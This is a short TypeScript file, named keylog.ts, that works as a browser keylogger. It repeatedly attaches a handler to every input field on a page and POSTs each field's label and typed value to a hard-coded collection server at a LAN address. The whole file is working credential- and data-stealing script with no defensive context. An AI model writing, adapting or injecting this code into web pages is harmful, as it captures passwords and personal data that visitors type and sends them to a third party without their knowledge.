// keylog.ts
function log(e) {
  const target = e.target;
  fetch("http://192.168.1.12:3030/data", {
    method: "POST",
    body: `${target?.ariaLabel}: ${target?.value}`
  });
}
setInterval(() => {
  const inputs = document.querySelectorAll("input");
  inputs.forEach((input) => {
    input.oninput = log;
  });
}, 3000);
